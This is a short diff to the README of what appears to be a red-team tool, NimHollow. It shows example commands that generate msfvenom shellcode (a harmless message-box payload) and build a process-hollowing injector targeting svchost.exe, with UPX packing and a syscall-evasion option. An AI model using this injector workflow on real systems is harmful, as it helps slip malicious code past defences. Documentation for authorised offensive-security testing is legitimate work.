@@ -28,8 +28,6 @@ Example:
 ```console
 ~$ msfvenom -p windows/x64/messagebox TITLE='MSF' TEXT='Hack the Planet!' EXITFUNC=thread -f raw -o shellcode.bin
 ~$ python3 NimHollow.py shellcode.bin -i 'C:\Windows\System32\svchost.exe' -o injector --upx --rm [--whispers2]
-~$ file injector.exe
-injector.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
 ```
 
 Help:
